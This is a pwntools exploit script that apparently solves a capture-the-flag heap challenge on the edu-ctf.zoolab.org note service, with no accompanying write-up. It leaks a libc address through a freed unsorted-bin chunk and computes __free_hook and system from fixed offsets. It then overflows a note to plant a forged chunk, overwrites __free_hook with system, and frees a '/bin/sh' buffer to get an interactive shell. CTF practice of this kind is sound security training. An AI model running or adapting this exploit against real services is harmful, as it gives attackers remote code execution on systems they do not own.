from pwn import *

context.arch = "amd64"

r = remote("edu-ctf.zoolab.org", 10007)

def add_note(idx: int, name: str):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendafter(b"> ", name.encode("ascii"))

def edit_data(idx: int, size: int, data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))
    r.sendlineafter(b"> ", str(size).encode("ascii"))
    r.send(data * size)

def del_note(idx: int):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", str(idx).encode("ascii"))

def show_notes():
    r.sendlineafter(b"> ", b"4")

gdb.attach(r)
add_note(0, "A" * 8)
edit_data(0, 0x418, b"A")

add_note(1, "B" * 8)
edit_data(1, 0x18, b"B")

add_note(2, "C" * 8)

del_note(0)
show_notes()

r.recvuntil(b"data: ")

# recv addr:
#    main_arena+96 = libc base + __malloc_hook+10+96 = libc base + 0x1ecbe0
libc = u64(r.recv(6).ljust(8, b"\x00")) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290

info(f"libc: {hex(libc + 0x1ecbe0)}")
info(f"libc: {hex(libc)}")

fake_chunk = flat(
    0, 0x21,
    b"CCCCCCCC", b"CCCCCCCC",
    free_hook,
)

data = b"/bin/sh\x00".ljust(0x10, b"B")
edit_data(1, 0x38, data + fake_chunk)
edit_data(2, 0x8, p64(system))

del_note(1)

r.interactive()